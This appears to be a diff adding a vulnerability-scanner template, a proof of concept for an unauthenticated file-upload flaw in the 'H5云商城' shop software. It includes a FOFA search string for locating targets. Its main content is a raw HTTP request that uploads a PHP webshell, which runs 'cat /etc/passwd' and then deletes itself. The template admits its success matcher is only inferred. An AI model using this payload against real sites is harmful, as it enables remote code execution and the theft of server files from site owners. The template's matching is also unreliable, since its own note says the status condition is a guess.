@@ -1,0 +1,39 @@
+id: poc-dc852a8f6e8dbac3e8f0
+info:
+  name: H5云商城file.php存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dc852a8f6e8dbac3e8f053b834dd88e1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dc852a8f6e8dbac3e8f053b834dd88e1
+    fofa: body="/public/qbsp.php""
+http:
+- raw:
+  - 'POST /admin/commodtiy/file.php?upload=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+    Content-Disposition: form-data; name="file"; filename="rce.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php system("cat /etc/passwd");unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
